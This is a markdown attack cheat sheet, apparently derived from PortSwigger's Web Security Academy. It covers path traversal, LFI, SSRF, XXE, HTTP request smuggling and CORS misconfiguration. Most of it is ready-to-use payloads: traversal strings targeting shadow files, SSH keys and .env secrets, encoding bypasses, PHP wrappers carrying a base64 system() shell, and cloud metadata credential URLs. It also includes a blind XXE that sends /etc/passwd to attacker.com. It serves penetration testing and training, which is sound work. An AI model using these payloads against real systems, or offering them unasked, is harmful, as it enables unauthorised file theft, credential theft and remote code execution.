# File Path Traversal & XXE & HTTP Smuggling & CORS — Complete Reference

> Based on PortSwigger Web Security Academy (2026-08)
> Covers: Path Traversal, SSRF (basic — see info-disclosure for comprehensive), XXE, HTTP Request Smuggling, CORS Misconfiguration
> **⚠️ SSRF/comprehensive filter bypass/cloud metadata → prefer `info-disclosure-complete.md` for full coverage. This file's SSRF section is a quick-reference subset.**

---

## 1. FILE PATH TRAVERSAL (Directory Traversal)

### 1.1 What It Is
Attacker reads/writes arbitrary files on the server by manipulating file paths with `../` sequences.

**Typical entry point:** User-controlled filename parameter:
```
/loadImage?filename=218.png
```

### 1.2 Basic Exploitation

**Linux:**
```
../../../etc/passwd
../../../../etc/shadow
../../../../var/log/apache2/access.log
../../../../proc/self/environ
../../../../home/user/.ssh/id_rsa
```

**Windows:**
```
..\..\..\windows\win.ini
..\..\..\windows\system32\config\sam
..\..\..\inetpub\wwwroot\web.config
```

### 1.3 Bypass Filters & Obfuscation

#### Non-Recursive Strip Bypass
If server strips `../` once:
```
....//           → after strip = ../
....\\/           → after strip = ../
..%2f..%2f..%2f  → after strip = ../../../
```

#### URL Encoding
```
%2e%2e%2f         → ../
%2e%2e/           → ../
.%2e/             → ../
%252e%252e%252f    → ../../ (double encode)
..%c0%af          → ../ (UTF-8 overlong encoding)
..%ef%bc%8f       → ../ (fullwidth solidus)
```

#### Null Byte (Legacy PHP < 5.3.4)
```
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg
```

#### Absolute Path
```
/etc/passwd
C:\windows\win.ini
```

#### Base Path Prepend
If app requires filename to start with base folder:
```
/var/www/images/../../../etc/passwd
```

#### Windows Short Names (8.3)
```
..\..\..\windows\win.ini
..\..\..\progra~1\apache~1\conf\httpd.conf
```

### 1.4 Writing Arbitrary Files

**Via path traversal + file upload:**
```
../../uploads/shell.php
..\..\wwwroot\shell.asp
```

**Log poisoning → RCE:**
1. Inject PHP/ASP code into User-Agent → stored in access.log
2. Traversal to log file → server executes injected code

### 1.5 Target Files to Exfiltrate
| File | Why |
|------|-----|
| `/etc/passwd` | User enumeration |
| `/etc/shadow` | Password hashes |
| `/etc/hosts` | Internal hostnames |
| `/proc/self/environ` | Environment variables (tokens, keys) |
| `/proc/self/fd/N` | Open file descriptors |
| `/var/log/apache2/access.log` | Log poisoning for RCE |
| `/proc/version` | Kernel version |
| `~/.ssh/id_rsa` | SSH private key |
| `~/.bash_history` | Command history |
| `/opt/app/config.yml` | Application config (DB creds, API keys) |
| `/app/.env` | Environment secrets |
| `/docker/daemon.json` | Docker config |
| `C:\windows\win.ini` | Windows proof |
| `C:\inetpub\wwwroot\web.config` | IIS config (DB connection strings) |
| `C:\windows\system32\drivers\etc\hosts` | Windows hosts file |
| `D:\sites\wwwroot\web.config` | Alt IIS path |
| `D:\sites\wwwroot\appsettings.json` | .NET secrets |

### 1.6 Detection Checklist
- [ ] Test all filename/path parameters with `../`
- [ ] Check multiple parameters in the same request
- [ ] Test with URL encoding: `%2e%2e%2f`
- [ ] Test with double encoding: `%252e%252e%252f`
- [ ] Test null byte: `../../../etc/passwd%00.png`
- [ ] Test absolute path: `/etc/passwd`
- [ ] Check response for file contents or error messages
- [ ] If file read fails, check for log files (access.log, error.log)
- [ ] Try directory listing: `../../../var/www/`

### 1.7 Related: LFI (Local File Inclusion)
PHP-specific via `include`, `require`, `file_get_contents`:
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=config.php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
?page=expect://id
?page=php://input        (POST body: <?php system('id'); ?>)
?page=/proc/self/environ (if include is in environment variable context)
```

### 1.8 RCE via Path Traversal
1. **Log poisoning:** Inject code in User-Agent → traverse to access.log
2. **/proc/self/environ:** If PHP `include` is called with user-controlled env var
3. **/proc/self/fd/N:** File descriptor traversal
4. **Zip slip:** Upload malicious ZIP with `../../shell.php` entry
5. **Symlink attack:** Create symlink to sensitive file, upload it

---

## 2. SERVER-SIDE REQUEST FORGERY (SSRF) — Quick Reference

> **⚠️ For comprehensive SSRF (filter bypass, URL schemes, blind chains, cloud metadata), see `info-disclosure-complete.md` §10-11.**

### 2.1 Basic SSRF (Internal)
```
POST /product/stock HTTP/1.0
stockApi=http://localhost/admin
```

### 2.2 SSRF Against Backend Systems
```
stockApi=http://192.168.0.1/internal-api/admin
stockApi=http://10.0.0.1:8080/management
```

### 2.3 SSRF for Scanning Internal Infrastructure
```
stockApi=http://127.0.0.1:22    → SSH
stockApi=http://127.0.0.1:3306  → MySQL
stockApi=http://127.0.0.1:6379  → Redis
stockApi=http://127.0.0.1:8080  → Admin panel
stockApi=http://127.0.0.1:9200  → Elasticsearch
```

### 2.4 Blind SSRF Detection
Trigger out-of-band HTTP request:
```
stockApi=http://BURP_COLLABORATOR_ID.burpcollaborator.net
```

### 2.5 Common SSRF Filter Bypass (Quick)
```
http://127.0.0.1.nip.io   → DNS rebinding
http://0177.0.0.1         → octal IP
http://0x7f.0x0.0x0.0x1   → hex IP
http://2130706433          → decimal IP
http://0                    → 0.0.0.0 (some systems treat as 127.0.0.1)
http://[::1]              → IPv6 loopback
```

### 2.6 Cloud Metadata SSRF (Quick)
```
# AWS (IMDSv2 requires token)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/

# Azure (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 2.7 SSRF → RCE Chains
1. **Redis SSRF:** Write cron job via `gopher://127.0.0.1:6379/_*3...`
2. **Memcached:** Inject session data
3. **Internal admin panels:** CSRF on internal services
4. **Log4Shell via SSRF:** SSRF triggers JNDI lookup
5. **Kubernetes:** SSRF to API server → create pods

---

## 3. XML EXTERNAL ENTITY (XXE)

### 3.1 What It Is
Server parses XML input with external entity definitions → reads files or performs SSRF.

### 3.2 Classic XXE — File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 3.3 Blind XXE (OOB Data Exfiltration)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

**evil.dtd:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 3.4 XXE via SVG Upload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### 3.5 XInclude Attack
When you can't control the DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 3.6 XXE via Content-Type Change
```
POST /action HTTP/1.0
Content-Type: text/xml    ← change from application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### 3.7 XXE SSRF
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service/admin">
]>
<root>&xxe;</root>
```

### 3.8 Java-Specific XXE
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Vulnerable:
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream);

// Secure:
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### 3.9 Detection Checklist
- [ ] Find XML input points (SOAP, SVG, DOCX, config import/export)
- [ ] Test with basic file read entity
- [ ] Test blind XXE with OOB (Burp Collaborator)
- [ ] Change Content-Type to `text/xml` or `application/xml`
- [ ] Try XInclude if DOCTYPE not allowed
- [ ] Check error messages for XML parsing errors
- [ ] Test with file upload (SVG, DOCX)

---

## 4. HTTP REQUEST SMUGGLING

### 4.1 What It Is
Front-end and back-end servers disagree on request boundaries → attacker injects payload into another user's request.

### 4.2 CL.TE (Content-Length vs Transfer-Encoding)
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

SMUGGLED
```
→ `SMUGGLED` becomes start of next user's request.

### 4.3 TE.CL
```
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### 4.4 TE.TE (Obfuscation)
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked\r\n
Transfer-Encoding: chunked
X-Ignore: X
```

### 4.5 H2C Smuggling
```
CONNECT target.com:443 HTTP/1.1
Host: target.com
```

### 4.6 Impact
Cache poisoning, request hijacking, reflected XSS, access control bypass, credential theft.

### 4.7 Detection
- Send request with both CL and TE headers
- Observe timing differences
- Try CL.TE, TE.CL, TE.TE patterns

### 4.8 Tools
```bash
python3 smuggler.py -u https://target.com -m CL.TE
h2c-smuggler -u https://target.com
```

---

## 5. CORS MISCONFIGURATION

### 5.1 Reflected Origin
```
Origin: https://evil.com → Access-Control-Allow-Origin: https://evil.com
```

### 5.2 Null Origin
```
Origin: null → Access-Control-Allow-Origin: null
```

### 5.3 Regex/Subdomain Bypass
```
*.vulnerable-website.com → attacker.vulnerable-website.com
```

### 5.4 Detection
```bash
curl -H "Origin: https://evil.com" -v https://target.com/api/me
```

---

## 6. UNIVERSAL ATTACK CHECKLIST
- [ ] SQL/NoSQL injection
- [ ] OS command injection
- [ ] Path traversal (../, encoding, null byte)
- [ ] File upload bypass
- [ ] SSRF (blind + cloud metadata)
- [ ] XXE (SVG, SOAP, Content-Type change)
- [ ] Request smuggling (CL.TE, TE.CL, TE.TE, H2C)
- [ ] XSS (reflected, stored, DOM)
- [ ] CORS misconfiguration
- [ ] CSRF
- [ ] Clickjacking
- [ ] Open redirect
- [ ] Authentication attacks
- [ ] JWT attacks
- [ ] Subdomain takeover
- [ ] Cloud metadata (AWS/GCP/Azure)

---

## 7. REPORT TEMPLATES

**Path Traversal — CVSS 9.8:** Arbitrary File Read via Path Traversal in [parameter]
**SSRF — CVSS 8.6:** Server-Side Request Forgery in [parameter]
**XXE — CVSS 8.6:** XML External Entity Injection in [endpoint]
**Request Smuggling — CVSS 9.1:** HTTP Request Smuggling via CL.TE Discrepancy
**CORS — CVSS 7.5:** CORS Misconfiguration Allows Cross-Origin Data Theft

---

## References
- PortSwigger: https://portswigger.net/web-security/file-path-traversal
- PortSwigger: https://portswigger.net/web-security/ssrf
- PortSwigger: https://portswigger.net/web-security/xxe
- PortSwigger: https://portswigger.net/web-security/request-smuggling
- PortSwigger: https://portswigger.net/web-security/cors
- **Cross-reference:** `info-disclosure-complete.md` — comprehensive SSRF filter bypass, cloud metadata (4 providers), SSTI, GraphQL info disclosure
